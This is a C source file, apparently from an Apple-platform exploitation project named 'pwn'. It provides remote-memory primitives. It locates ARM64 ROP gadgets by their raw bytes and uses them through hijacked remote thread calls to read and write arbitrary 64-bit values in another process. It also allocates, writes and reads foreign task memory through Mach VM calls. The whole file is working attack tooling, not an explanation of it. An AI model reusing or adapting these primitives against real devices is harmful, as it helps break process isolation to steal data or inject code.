//
//  dxnu_rmem.c
//  pwn
//
//  Created by Sem Voigtländer on 1/8/19.
//  Copyright © 2019 Sem Voigtländer. All rights reserved.
//

#include "remotemem.h"
#include "remotecall.h"
#include "userlandgadgets.h"

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdarg.h>
#include <pthread.h>

#include <mach/mach.h>
#include <mach/machvm.h>
#include <mach/task.h>
#include <mach/mach_error.h>
#include <mach/mach_traps.h>

uint64_t r64_userlandgadget_addr = 0;
uint64_t find_r64_gadget() {
    if (r64_userlandgadget_addr != 0) {
        return r64_userlandgadget_addr;
    }
    char* ldr_x0_indirect_x0 = "\x00\x00\x40\xf9\xc0\x03\x5f\xd6"; // ldr x0, [x0]; ret
    char* candidates[] = {ldr_x0_indirect_x0, NULL};
    r64_userlandgadget_addr = find_userlandgadget_candidate(candidates, 8);
    return r64_userlandgadget_addr;
}

uint64_t w64_gadget_addr = 0;
uint64_t find_w64_gadget() {
    if (w64_gadget_addr != 0) {
        return w64_gadget_addr;
    }
    char* str_x1_indirect_x0 = "\x01\x00\x00\xf9\xc0\x03\x5f\xd6"; // str x1, [x0]; ret
    char* candidates[] = {str_x1_indirect_x0, NULL};
    w64_gadget_addr = find_userlandgadget_candidate(candidates, 8);
    return w64_gadget_addr;
}

uint64_t thread_r64(mach_port_t thread_port, uint64_t addr) {
    uint64_t gadget = find_r64_gadget();
    uint64_t val = (uint64_t) thread_call_remote(thread_port, (void*)gadget, 1, REMOTE_LITERAL(addr));
    return val;
}

uint64_t thread_w64(mach_port_t thread_port, uint64_t addr, uint64_t value) {
    uint64_t gadget = find_w64_gadget();
    uint64_t val = (uint64_t) thread_call_remote(thread_port, (void*)gadget, 2, REMOTE_LITERAL(addr), REMOTE_LITERAL(value));
    return val;
}

void* thread_rstr(mach_port_t thread_port, uint64_t addr) {
    uint64_t len = thread_call_remote(thread_port, strlen, 1, REMOTE_LITERAL(addr));
    len += 9;
    
    uint64_t remote_copy_addr = thread_call_remote(thread_port, malloc, 1, REMOTE_LITERAL(len));
    thread_call_remote(thread_port, strcpy, 2, REMOTE_LITERAL(remote_copy_addr), REMOTE_LITERAL(addr));
    
    uint64_t* local_string = malloc(len);
    
    for (int i = 0; i < len/8; i++) {
        local_string[i] = thread_r64(thread_port, remote_copy_addr + (i*8));
    }
    
    thread_call_remote(thread_port, free, 1, REMOTE_LITERAL(remote_copy_addr));
    
    return local_string;
}

void test_thread_rw(mach_port_t thread_port) {
    uint64_t addr = (uint64_t)malloc;
    printf("reading from %llx\n", addr);
    
    printf("locally we see: %llx\n", *(uint64_t*)addr);
    
    uint64_t val = thread_r64(thread_port, addr);
    printf("remotely we read: %llx\n", val);
}

uint64_t
remote_alloc(mach_port_t task_port,
             uint64_t size)
{
    kern_return_t err;
    
    mach_vm_offset_t remote_addr = 0;
    mach_vm_size_t remote_size = (mach_vm_size_t)size;
    err = mach_vm_allocate(task_port, &remote_addr, remote_size, 1); // ANYWHERE
    if (err != KERN_SUCCESS){
        printf("unable to allocate buffer in remote process\n");
        return 0;
    }
    return (uint64_t)remote_addr;
}

void
remote_free(mach_port_t task_port,
            uint64_t base,
            uint64_t size)
{
    kern_return_t err;
    
    err = mach_vm_deallocate(task_port, (mach_vm_address_t)base, (mach_vm_size_t)size);
    if (err !=  KERN_SUCCESS){
        printf("unabble to deallocate remote buffer\n");
        return;
    }
    return;
}

uint64_t
alloc_and_fill_remote_buffer(mach_port_t task_port,
                             uint64_t local_address,
                             uint64_t length)
{
    kern_return_t err;
    
    uint64_t remote_address = remote_alloc(task_port, length);
    
    err = mach_vm_write(task_port, remote_address, (mach_vm_offset_t)local_address, (mach_msg_type_number_t)length);
    if (err != KERN_SUCCESS){
        printf("unable to write to remote memory\n");
        return 0;
    }
    
    return remote_address;
}

void
remote_read_overwrite(mach_port_t task_port,
                      uint64_t remote_address,
                      uint64_t local_address,
                      uint64_t length)
{
    kern_return_t err;
    
    mach_vm_size_t outsize = 0;
    err = mach_vm_read_overwrite(task_port, (mach_vm_address_t)remote_address, (mach_vm_size_t)length, (mach_vm_address_t)local_address, &outsize);
    if (err != KERN_SUCCESS){
        printf("remote read failed\n");
        return;
    }
    
    if (outsize != length){
        printf("remote read was short (expected %llx, got %llx\n", length, outsize);
        return;
    }
}

void
remote_write(mach_port_t remote_task_port,
             uint64_t remote_address,
             uint64_t local_address,
             uint64_t length)
{
    kern_return_t err = mach_vm_write(remote_task_port,
                                      (mach_vm_address_t)remote_address,
                                      (vm_offset_t)local_address,
                                      (mach_msg_type_number_t)length);
    if (err != KERN_SUCCESS) {
        printf("remote write failed: %s %x\n", mach_error_string(err), err);
        return;
    }
}
